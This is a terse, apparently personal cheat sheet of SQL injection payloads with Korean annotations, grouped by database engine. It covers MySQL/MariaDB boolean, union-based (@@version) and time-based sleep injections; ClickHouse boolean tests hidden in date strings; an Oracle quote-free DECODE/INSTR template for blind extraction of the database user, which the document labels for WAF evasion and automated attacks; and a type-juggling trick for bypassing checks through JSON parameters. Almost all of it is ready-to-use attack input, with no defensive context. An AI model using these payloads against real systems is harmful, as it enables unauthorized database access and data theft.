# SQLI PAYLOAD

## mysql mariadb
||1=1%20limit%201%20%23  
||1=2%20limit%201%20%23  
{"or 1=1 -- ":"asdf"}//딕셔너리  
"1param":"asdf%') /*"  
"2param":" */ union select 0,0,0,@@version,0 --a"  
DESC, (select sleep(3)) -- -  



## clickhouse
2024-0'||case when 1=1 then 5 else 0x2b end||'-10 23:30:58  
2024-0'||case when 1=2 then 5 else 0x2b end||'-10 23:30:58  


## oracle
정렬부분(쿼터, SELECT 없이 ,WAF우회)

DECODE(INSTR(CHR(65),CHR(65),1,1),1,TRUE값,FALSE값)

DECODE(INSTR(CHR(65),CHR(66),1,1),1,TRUE값,FALSE값)

->자동화 공격

DECODE(INSTR(USER,CHR({ascii_code}),{pos},1),{pos},TRUE값,FALSE값)

## type juggling
 SELECT * FROM testdata WHERE id = 1\G; => None
 SELECT * FROM testdata WHERE id = 0\G; => 문자열 타입이 정수로는 0이므로 다나옴.
 따라서 json 파라미터에 false나 0 삽입 시 bypass 가능
